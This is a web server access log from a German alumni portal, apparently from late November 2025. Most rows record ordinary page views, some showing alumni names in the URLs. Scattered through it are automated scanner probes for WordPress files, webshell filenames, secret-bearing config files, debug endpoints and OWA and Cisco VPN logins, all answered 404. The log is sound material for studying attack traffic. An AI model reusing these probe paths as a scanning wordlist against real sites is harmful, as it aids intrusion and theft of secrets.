56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-30 01:08:08;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;/personen/alumni/schule/170720;GET;200
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:08;;/;GET;200
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:09;;//wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:09;;//xmlrpc.php?rsd;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:10;;/;GET;200
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:10;;//blog/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:10;;//web/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:10;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:10;;//website/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:11;;//wp/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:11;;//news/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:11;;//2018/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:11;;//2019/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:11;;//shop/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:12;;//wp1/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:12;;//test/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:12;;//media/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:12;;//wp2/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:12;;//site/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:13;;//cms/wp-includes/wlwmanifest.xml;GET;404
5a2b6cba99d73e929b24754fd4b681573f542126e96cf38ba800a4e14914d925;2025-11-30 01:09:13;;//sito/wp-includes/wlwmanifest.xml;GET;404
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-30 01:09:33;/personen/alumni/details/thomas-matzig;/gruppen/hobby/wandern;GET;302
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-30 01:09:34;/personen/alumni/details/thomas-matzig;/gruppen;GET;200
bfdc119c93ec2d68d6bc07f9750206a94552d90ce93c91912f75fcc1493c8edd;2025-11-30 01:10:07;;/personen/alumni/schule/190627;GET;200
a8f2c145316b032bfdab21a0f208d2cc6fd3d6f7c4d15498fa00934df568504a;2025-11-30 01:10:12;;/;GET;200
4a7ae095ee9057fc5e5b617c61f37a7d39c344f61af75d3a156848500e07b28b;2025-11-30 01:12:32;;/personen/alumni/schule/4440012;GET;200
c8a637e10675817b5913f86b31040461af2d6aeca52582a94c608fed76d9e0df;2025-11-30 01:20:58;;/shell;GET;404
59ee7d4671911a01d1ff2ee02f0fcfc7d31ce0ff7bbe6eb3cd464bf2b1d00670;2025-11-30 01:23:13;;/webshell.php;GET;404
38b89b6bd2c6d38ef8df98833e2e43ab47b677eae1623fb4f0384e02ad5a1427;2025-11-30 01:23:14;;/webshell;GET;404
48dbf97a08999804ee87b388506c80446deacb0ee42bf0ec27302641faac42d3;2025-11-30 01:23:17;;/shell.php;GET;404
c7c22f6e5025a412352c7fb1d6ddabe019caedaba17bb09b1ae0fc5bfdd093de;2025-11-30 01:28:24;;/themen/details/abschied-aus-moabit;GET;200
67f9d703778c2a08657361e070fc19f3fd3f8fc71569edb4599709b65b399325;2025-11-30 01:31:43;;/;GET;200
7279043112c60c616787e6b833bd2eeae0bfe0bdb0e4c5b82bdf63bfaca2dd4a;2025-11-30 01:40:48;;/themen?category=bildung;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-30 01:41:41;/gruppen/hobby/programmieren;/gruppen/plausch/ai-driven-programme;GET;302
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-30 01:41:42;/gruppen/hobby/programmieren;/gruppen/hobby/programmieren;GET;302
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-30 01:41:43;/gruppen/hobby/programmieren;/gruppen;GET;200
db61f2019701e9eb52b3c25fba074ab3b5b44616778baafc8cbdca488c3dcb37;2025-11-30 01:56:31;;/.well-known/security.txt;GET;404
f60a1195a54ff55ac800c733611cd187edd86510c8d04f35cb1c26c959bcd42e;2025-11-30 02:20:41;;/;GET;200
b97221f2955d2263bd01e80a24c6ee77a1bb99e201314bad9d8a01e1044880a4;2025-11-30 02:20:53;;/sitemap.xml;GET;200
94820928a698b96f44fc384f5a08a3f72e9766c0fdf9c0bea9e7d56f97846962;2025-11-30 02:39:27;;/personen/alumni/schule/5506;GET;200
eb22af8ae7ad8f2157f48a46f52c51b5f98c2485e64c384304bd85abd27ccf2b;2025-11-30 02:45:41;/;/;GET;200
6b79d45312536ad23d5408a8e1241a4ee5abb64c0dfc27783126b5ca28d20c48;2025-11-30 02:46:03;/sitemap.xml;/sitemap.xml;GET;200
998f6129d79f3dce8a96082ac42cd454756ae59543580c53a1c5ed704a71b7b5;2025-11-30 02:46:25;;/login;GET;200
3be1390142cbdbaaeb8e35f36f4b57e022d7364db64ea32d1e306d39c8820fe1;2025-11-30 02:49:04;;/;GET;200
f9488aa00ecbdce234db6e06fdbe54d2645863a932fc750e4ee5af387cc079a9;2025-11-30 02:50:08;;/;GET;200
c4dec20a6fd741b0c22fc3fa4f85585fc5e49033f8c84b464dbda0d2029dabba;2025-11-30 02:50:30;/sitemap.xml;/sitemap.xml;GET;200
50a94e51fb94466824eb65f4960c26533fb0ba45178a26664e298f637dfac8bc;2025-11-30 02:50:53;;/sitemap.xml;GET;200
c39c6369e4f60bb9655f167ecc4471c2b5a9f0194cfb0972b2a196b0bec564e0;2025-11-30 02:51:06;;/config.json;GET;404
f16a7b400f03ce57dc324a89d91e2068d5ea66fea37a4a111185f771b69ad4d5;2025-11-30 03:01:16;;/personen/alumni/schule/HS001;GET;200
e97a8876783d5ce84ebe5f27c378a145f27ffb07e87b1e2ccd41fe42b672c5f6;2025-11-30 03:21:51;;/aktuelles/meldungen?category=wissenschaft;GET;200
6db6e29506e624544d782d97a25ca24723bb02c0bd3ba70e9ef8421b4b20fc8c;2025-11-30 03:22:26;/;/;GET;200
540060ff0c27ecd033087cbeb4edb9eb48e2adc5db5713c493ff03d0613e6218;2025-11-30 03:22:53;;/;GET;200
7eda4117a07e1ec9476bdceb97510f599b12f6013423b0c3833c9f601b5db83c;2025-11-30 03:29:48;;/gruppen/interesse/kommunikationsfahigkeiten;GET;200
1e475ae70610be502279ec334e80cfd43c6ae7e5950757cabe63cd52f2797519;2025-11-30 03:31:17;;/themen/details/lebenslanges-lernen-so-bleiben-sie-am-ball;GET;404
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-30 03:31:44;/?XDEBUG_SESSION_START=phpstorm;/?XDEBUG_SESSION_START=phpstorm;GET;200
8c826ad0bf59ab756b747e47932db8b71a3e7bf3a30289ebda78237b9aaae7fa;2025-11-30 03:44:07;;/personen/alumni/details/dilek-keskin;GET;200
78f64db058c80c40afe917f7b4816c1a2b2d6d909743db205c0c4bcfcf59b2c2;2025-11-30 03:46:02;;/personen/alumni/schule/4440012;GET;200
e1903b9dfb0513a307d33b9d96a83884743097ebe5968e841f2f45bf3378615c;2025-11-30 03:49:34;/;/;GET;200
620d3e9de098cfe040663951f7812f26a147bea893b3b1254af71d5b05d4524c;2025-11-30 04:21:45;;/gruppen/interesse/strategische-planung;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-30 04:35:18;;/gruppen/hobby/abschlussfest;GET;302
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-30 04:35:19;;/gruppen;GET;200
91b86a99a2906a16a35eebd5df4d25a3a8858869ad754393c8b42f6798883ed3;2025-11-30 04:37:40;;/personen/alumni/schule/5506;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-30 04:38:44;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
c4ea4054849d4d94bbe4c2d254ef90cc1ba53b6d787fcb6b5bcb50d4050dcd33;2025-11-30 04:50:01;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
519992535aa1d68629747525e40a92ffbf60148bdb3ca8983182dd37a7bfcddf;2025-11-30 04:50:06;;/gruppen/hobby/mathematik-wettbewerbe;GET;302
6a18689be466b235eaa7765156c27660306bc28b22e8e92c030057ee07c2a15f;2025-11-30 04:50:07;;/gruppen;GET;200
050f4f0569b1f084ae2c7347f29dfdc95432e54162fee5338f3b8b91c2b48c2d;2025-11-30 04:50:08;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
b018f9c4c9cd238ddb7d83fbdec32bd22b76dea7bdcaec846218a26e5c4c42ee;2025-11-30 04:55:24;;/;GET;200
b018f9c4c9cd238ddb7d83fbdec32bd22b76dea7bdcaec846218a26e5c4c42ee;2025-11-30 04:55:24;;/;GET;200
b018f9c4c9cd238ddb7d83fbdec32bd22b76dea7bdcaec846218a26e5c4c42ee;2025-11-30 04:55:24;;/;GET;200
b018f9c4c9cd238ddb7d83fbdec32bd22b76dea7bdcaec846218a26e5c4c42ee;2025-11-30 04:55:24;;/;GET;200
b018f9c4c9cd238ddb7d83fbdec32bd22b76dea7bdcaec846218a26e5c4c42ee;2025-11-30 04:55:34;;/;GET;200
496e9aa17dbfd877782a8527bf5056742bccbac0e3c398ecfc0adf034c212b2d;2025-11-30 04:56:02;;/login;GET;200
a1292c6722f0f7c5ccaf05ab5e9b5de4abd8b68974125ed45feec2e3a5cc18f3;2025-11-30 04:57:05;;/;GET;200
d8a115880ec4f11b1b43c956a3a57c24ad4e112e5d1f6d6fe151f515f8544eec;2025-11-30 05:01:02;;/;GET;200
962523ce7d341bd35afebc8af2ff5d86592439058f8b8171641e7e004ce5e17b;2025-11-30 05:01:02;;/;GET;200
d76fd6bf8ccbbbc392e29549e8e602acbdafac6f32d125467d4bf33bc6a51867;2025-11-30 05:05:37;;/personen/alumni/schule/190627;GET;200
36b591a1be989e454634e7658d5743b60d47645422baf224e82c7cf100ef16ec;2025-11-30 05:11:11;;/.well-known/security.txt;GET;404
96b04319f791c3da19bc84913f09e678f079914c02c5c58a35aa80df27ca79c4;2025-11-30 05:17:56;;/;GET;200
fed61cc13a9ae4302fd85aca18ffa184c5d6f14031d9bdbdfa4979ae2fa25539;2025-11-30 05:20:39;;/;GET;200
c9d5a36e57eb93dfaaea586187b166616ad2768400fdf2171933e74421700fe7;2025-11-30 05:34:16;;/personen/alumni/schule/5514;GET;200
a2cfdb497ed2a879b0d2e65708230e80354ea2f7289e182f02add14b56ae05a3;2025-11-30 05:37:59;;/.well-known/security.txt;GET;404
ac89f8d119bdb13518081cc73b5822802679be0ba08136cfb8033388c26b4974;2025-11-30 05:43:04;;/themen/2;GET;200
aa019067c214d463109f83a18595a9576786bbd55ca0fe627fc943e06a3b37aa;2025-11-30 05:43:09;;/themen/details/der-start-ins-studium;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-30 05:46:38;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-30 05:46:38;;/personen/alumni/schule/9002;GET;200
f44584fa6a505d2a7f9a727057c2696addc7b8ec3dadfa187937ea9c3fcff96c;2025-11-30 06:00:05;;/;GET;200
cb151998ab0f5ac4eb9c02c3e3cf6de2c368ed373962d2e29383030a7f465f11;2025-11-30 06:14:28;;/;GET;200
30e8736e7b051ff46d7c206df841c2f240c00ed8f6b87afa6b641e772f500d71;2025-11-30 06:17:43;;/;GET;200
ced2d99d35686a84e897f9728aa084f2d179e8ecd40998e5ba37da2f6f21f3a7;2025-11-30 06:20:13;;/owa/auth/logon.aspx;GET;404
657c590f14cf2274371c697cb830deacc7fc9a9ef8e5e7b987c41660f348f2fa;2025-11-30 06:23:55;;/;GET;200
54716ea857c4d0797dd52293a25964df0b49561a1dd5e4a590b625f26aec3160;2025-11-30 06:27:55;;/personen/alumni/schule/5506;GET;200
92edb0316033b2356142ebda13f37fccc2221f82351e6351414bcf97e82261a8;2025-11-30 06:37:44;;/;GET;200
822e7840f13dbeef15524054cc3ab07ddcac310c3d0f14071a90be201fee39c2;2025-11-30 06:42:51;;/;GET;200
f6512131e2cf8bd5d658004fd8a645c4aca60dd2ff3b22cd9a9a28f09ed9e261;2025-11-30 06:47:04;;/personen/alumni/schule/HS001;GET;200
86540bc3b2bcdac34bde2eec7d1c7c5c23c3f92e38e0d2e6b4f0813edb0a8400;2025-11-30 06:50:08;;/;GET;200
86540bc3b2bcdac34bde2eec7d1c7c5c23c3f92e38e0d2e6b4f0813edb0a8400;2025-11-30 06:50:51;;/sitemap.xml;GET;200
e10b8d4f84cc0cc66fac78b1c99e025bc71c556b10fa3cab7799fdd199f6c678;2025-11-30 06:51:04;;/config.json;GET;404
9a8209675c047a82aadebff74d3db76ca8ad961cd44ce194c1ad32cbd32bb64e;2025-11-30 06:51:49;;/gruppen/interesse/recht-und-verwaltung;GET;200
1616423c060145e8080363474ffa74fb1925ae7b87e2b7ce7cea526f1ed94739;2025-11-30 06:52:06;/;/;GET;200
a351143fc569c03d524e0d2f228208a3e5af5d81b91223b647ce8b1c1f826190;2025-11-30 06:52:31;/;/;GET;200
5d15e8e7afc16abd83d7053d1c86cb3987d081d27c843394d004d31c6c5b633a;2025-11-30 06:52:49;/sitemap.xml;/sitemap.xml;GET;200
54b4428848cc2714945a183c73477fa0c45344792f1a621f2f8f2da617ac3819;2025-11-30 06:55:37;;/gruppen/hobby/gartnern;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 07:01:36;/gruppen/hobby/grafikdesign;/gruppen/hobby/chemie;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 07:01:37;/gruppen/hobby/grafikdesign;/gruppen;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-30 07:01:38;;/themen?category=bildung;GET;200
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-30 07:04:21;;/app_dev.php/_profiler/phpinfo;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-30 07:04:22;;/?phpinfo=-1;GET;200
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-30 07:04:24;;/debug/default/view?panel=config;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-30 07:04:28;;/.json;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-30 07:04:37;;/aws.yml;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-30 07:04:40;;/env.txt;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-30 07:04:44;;/test.php;GET;404
a98890b481120d1bef68623119337f9622605ecd51003b53683dd60fa25645a4;2025-11-30 07:06:06;;/personen/alumni/schule/5508;GET;200
a847c6d0c07fa01803cfbf14681e9607d3518b806a9362a747cf39b0b0b5c4cb;2025-11-30 07:08:31;;/owa/auth/logon.aspx?replaceCurrent=1&url=https%3A//owa.alumni-portal.org/owa/;GET;404
a847c6d0c07fa01803cfbf14681e9607d3518b806a9362a747cf39b0b0b5c4cb;2025-11-30 07:08:32;;/owa/auth/logon.aspx?replaceCurrent=1&url=http%3A//owa.alumni-portal.org/owa/;GET;404
a847c6d0c07fa01803cfbf14681e9607d3518b806a9362a747cf39b0b0b5c4cb;2025-11-30 07:08:32;;/owa/auth/logon.aspx?replaceCurrent=1&url=http%3A//mail.alumni-portal.org/owa/;GET;404
a847c6d0c07fa01803cfbf14681e9607d3518b806a9362a747cf39b0b0b5c4cb;2025-11-30 07:08:32;;/owa/auth/logon.aspx?replaceCurrent=1&url=https%3A//owa.mail.alumni-portal.org/owa/;GET;404
a847c6d0c07fa01803cfbf14681e9607d3518b806a9362a747cf39b0b0b5c4cb;2025-11-30 07:08:33;;/owa/auth/logon.aspx?replaceCurrent=1&url=http%3A//owa.mail.alumni-portal.org/owa/;GET;404
a847c6d0c07fa01803cfbf14681e9607d3518b806a9362a747cf39b0b0b5c4cb;2025-11-30 07:08:33;;/;GET;200
26dd447ba215411963ab71ea26afdd3e0c1cfc8d4db50bb03c549420ccd47b3c;2025-11-30 07:09:55;;/personen/alumni/details/heidi-burghard;GET;200
06fad62e132f738ab6b9c6f255ef629d4f5f813a17414cee53aa6b2db6b47dc7;2025-11-30 07:24:12;;/personen/all/5;GET;200
37eecc1f2041348110b9101ee2703c810e61ccd87f99976d5fc0279ac90718a5;2025-11-30 07:24:26;;/personen/alumni/schule/5501;GET;200
f833e6935f97cd4b9d2e6d42a6a4f07403f6bc0a68bcf1ce7ad3c48a50befb13;2025-11-30 07:24:33;;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-30 07:28:47;/themen/details/uni-zwischen-ebbe-und-flut;/themen/details/david-gegen-goliath;GET;200
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:30:59;;/;GET;200
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:00;;//wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:00;;//xmlrpc.php?rsd;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:00;;/;GET;200
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:00;;//blog/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:01;;//web/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:01;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:02;;//website/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:02;;//wp/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:02;;//news/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:02;;//2018/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:02;;//2019/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:03;;//shop/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:03;;//wp1/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:03;;//test/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:03;;//media/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:04;;//wp2/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:04;;//site/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:04;;//cms/wp-includes/wlwmanifest.xml;GET;404
54a3f931179e50e0606384c236cc3e2e42375ba6b470dab5951cdea4772af463;2025-11-30 07:31:05;;//sito/wp-includes/wlwmanifest.xml;GET;404
4d5d6254dfe2f0b0a0d237a1e3004297a96e3f7f03df8afc7128e7d003c3dbe3;2025-11-30 07:37:55;;/;GET;200
6d3674aee248629c8b748db2212e4eada2fd2b6cc971bc94f3bd218b1276e99c;2025-11-30 07:38:30;;/+CSCOL+/Java.jar;GET;404
6d3674aee248629c8b748db2212e4eada2fd2b6cc971bc94f3bd218b1276e99c;2025-11-30 07:38:32;;/+CSCOE+/logon_forms.js;GET;404
6d3674aee248629c8b748db2212e4eada2fd2b6cc971bc94f3bd218b1276e99c;2025-11-30 07:38:34;;/+CSCOL+/a1.jar;GET;404
6d3674aee248629c8b748db2212e4eada2fd2b6cc971bc94f3bd218b1276e99c;2025-11-30 07:38:36;;/+CSCOE+/transfer.js;GET;404
cc9e69847d2d9c7fad19960fefd66b8fb4cdd92f7161eab14409f439a981552e;2025-11-30 07:44:02;;/personen/alumni/schule/4240016;GET;200
255b188ac3d7988d5b7b84f3d91d94374acdd210fc447dbab1f889695efd8395;2025-11-30 07:46:42;;/;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-30 07:50:39;;/;GET;200
fbf50bdf7cd9e9c12c7027376dcbc64d93afd9f24d5f4b57026ac543bfce343b;2025-11-30 08:11:54;;/gruppen/hobby/journalismus;GET;302
24f59bc90098e42b8e591a264a525151e08aaae6d63f11f7eafd9a3289419e1d;2025-11-30 08:11:59;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-30 08:13:44;/personen/alumni/schule/5503;/personen/alumni/schule/190962;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-30 08:15:14;/personen/alumni/details/sami-teuchert;/personen/alumni/details/sami-teuchert;GET;200
55ba1f31e330352661b43d3275dad2a303675546c75fe98bef1d75f73056674c;2025-11-30 08:16:14;;/;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-30 08:16:33;/gruppen/hobby/grafikdesign;/gruppen/hobby/wandern;GET;302
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-30 08:16:34;/gruppen/hobby/grafikdesign;/gruppen;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-30 08:17:56;/personen/alumni/schule/5503;/personen/alumni/schule/5514;GET;200
dafbe103d02020e12a1ca5a150507f2b797e52a7eff80625946f28508101dc57;2025-11-30 08:18:28;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testenilias.php?baseClass=ilstartupgui&cmd=post&fallbackCmd=doStandardAuthentication&lang=de&client_id=TreptowKolleg;GET;404
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-30 08:19:23;/personen/alumni/schule/5503;/personen/alumni/schule/4340014;GET;200
9442eb24b1fcd918e66c58e312e098e1c68e71b1efed96c076e5044e1d491da9;2025-11-30 08:20:46;;/personen/alumni/details/sidney-dittrich;GET;200
4970dc208f394a87f421a59e36e0c75591fe7ff360dda282097083b680239f2a;2025-11-30 08:23:51;;/;GET;200
4970dc208f394a87f421a59e36e0c75591fe7ff360dda282097083b680239f2a;2025-11-30 08:23:51;;/;GET;200
4970dc208f394a87f421a59e36e0c75591fe7ff360dda282097083b680239f2a;2025-11-30 08:23:51;;/;GET;200
4970dc208f394a87f421a59e36e0c75591fe7ff360dda282097083b680239f2a;2025-11-30 08:23:51;;/;GET;200
4970dc208f394a87f421a59e36e0c75591fe7ff360dda282097083b680239f2a;2025-11-30 08:23:52;;/;GET;200
4970dc208f394a87f421a59e36e0c75591fe7ff360dda282097083b680239f2a;2025-11-30 08:23:52;;/;GET;200
4970dc208f394a87f421a59e36e0c75591fe7ff360dda282097083b680239f2a;2025-11-30 08:23:52;;/;GET;200
4970dc208f394a87f421a59e36e0c75591fe7ff360dda282097083b680239f2a;2025-11-30 08:23:52;;/;GET;200
dc691caa830bd462f5544d5ac898b05075e695d82277fecd91a78d24224b6675;2025-11-30 08:30:25;;/personen/alumni/schule/5506;GET;200
6e97b0707008ae69c7d81d184a970d43f444ef7328cf9b0ea09c41b370ef4190;2025-11-30 08:30:38;;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 08:31:30;/gruppen/hobby/grafikdesign;/gruppen/hobby/yoga-und-meditation;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 08:31:31;/gruppen/hobby/grafikdesign;/gruppen;GET;200
8e80cbd4248a929f38f67575f8726107a0e84a0e416d452ef6010e89dd5f6e97;2025-11-30 08:39:35;;/gruppen/interesse/weiterbildung-und-training;GET;200
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:37;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:38;;/shoha.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:38;;/bkxzo.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:38;;/ioxi-o2.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:38;;/777.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:39;;/404.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:39;;/raw.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:39;;/m.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:39;;/bolt.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:40;;/efile.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:40;;/db.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:40;;/222.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:40;;/ton.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:41;;/wp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:41;;/sto.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:41;;/n3.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:41;;/luxe.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:42;;/mans.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:42;;/an.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:42;;/bless5.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:42;;/403.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-30 08:39:43;;/1.php;GET;404
